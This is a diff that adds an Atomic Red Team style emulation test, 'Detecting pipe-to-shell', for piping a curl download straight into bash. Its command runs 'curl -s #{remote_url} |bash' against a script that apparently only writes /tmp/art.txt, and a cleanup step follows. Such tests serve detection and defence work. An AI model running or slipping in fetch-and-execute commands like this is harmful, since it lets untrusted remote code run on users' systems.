@@ -199,3 +199,33 @@ atomic_tests:
       echo $ART |/bin/bash
     cleanup_command: | 
       unset ART
+- name: Detecting pipe-to-shell
+  description: |
+    An adversary may develop a useful utility or subvert the CI/CD pipe line of a legitimate utility developer, who requires or suggests installing their utility by piping a curl download directly into bash. Of-course this is a very bad idea. The adversary may also take advantage of this BLIND install method and selectively running extra commands in the install script for those who DO pipe to bash and not for those who DO NOT. This test uses curl to download the pipe-to-shell.sh script, the first time without piping it to bash and the second piping it into bash which executes the echo command.
+  supported_platforms:
+  - linux
+  input_arguments:
+    remote_url:
+      description: url of remote payload
+      type: Url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      Check if running on a Debian based machine.
+    prereq_command: |
+      if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then echo "Debian"; else echo "NOT Debian"; exit 1; fi
+      if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
+    get_prereq_command: |
+      apt update && apt install -y curl
+  executor:
+    name: bash
+    elevation_required: false
+    command: |
+      cd /tmp
+      curl -s #{remote_url}
+      ls -la /tmp/art.txt
+      curl -s #{remote_url} |bash
+      ls -la /tmp/art.txt      
+    cleanup_command: |
+      rm /tmp/art.txt
